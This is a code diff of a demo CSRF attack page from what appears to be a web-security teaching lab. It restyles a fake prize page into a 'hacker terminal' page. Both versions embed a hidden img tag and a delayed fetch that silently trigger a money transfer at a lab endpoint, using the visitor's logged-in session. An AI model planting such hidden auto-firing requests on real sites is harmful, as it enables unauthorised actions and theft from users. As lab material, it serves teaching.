@@ -2,35 +2,33 @@
 <html lang="zh-CN">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>黑客钓鱼网站</title>
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@picocss/pico@2.0.6/css/pico.min.css">
+    <title>HACKER_NODE</title>
+    <link rel="stylesheet" href="/css/style.css">
 </head>
-<body class="container">
-    <hgroup>
-        <h2>🎁 恭喜你中奖了！</h2>
-        <p>（这是一个伪造的网页，表面在发奖品，实际上正在偷偷利用你的身份请求银行）</p>
-    </hgroup>
+<body>
+    <div class="terminal-panel panel-red">
+        <h2 style="color: var(--color-red);">[D5] Exploit Node</h2>
+        <p style="color: var(--color-red);">> Injecting cross-site payload...</p>
 
-    <!-- 隐藏的 CSRF 攻击代码：利用 img 标签自动发起 GET 请求 -->
-    <img src="/api/d5/unsafe-transfer" style="display: none;" alt="攻击代码">
-
-    <article style="text-align: center; border-color: #e74c3c;">
-        <h3 style="color: #e74c3c;">正在利用你的身份偷偷转账...</h3>
-        <p id="status">请去“银行”标签页刷新余额看看发生了什么。</p>
-    </article>
+        <div class="terminal-output" style="border-color: var(--color-red);">
+            <div id="status">Waiting for target connection...</div>
+        </div>
+        
+        <!-- 隐蔽的 CSRF 攻击载荷 -->
+        <img src="/api/d5/unsafe-transfer" style="display: none;">
+    </div>
+    <a href="/" class="back-link">&lt; RETURN TO TERMINAL</a>
 
     <script>
-        // 为了让你直观看到，我们不仅用 img 标签发 GET 请求，还用 JS 发一次并显示结果
         setTimeout(async () => {
             try {
                 const res = await fetch('/api/d5/unsafe-transfer');
                 const data = await res.json();
                 if (data.message) {
-                    document.getElementById('status').textContent = "攻击结果：" + data.message;
+                    document.getElementById('status').textContent = "> EXECUTION SUCCESS: " + data.message;
                 }
             } catch (e) {
-                document.getElementById('status').textContent = "攻击失败，可能你没有先在银行页面登录。";
+                document.getElementById('status').textContent = "> EXECUTION FAILED: Target not logged in.";
             }
         }, 1000);
     </script>
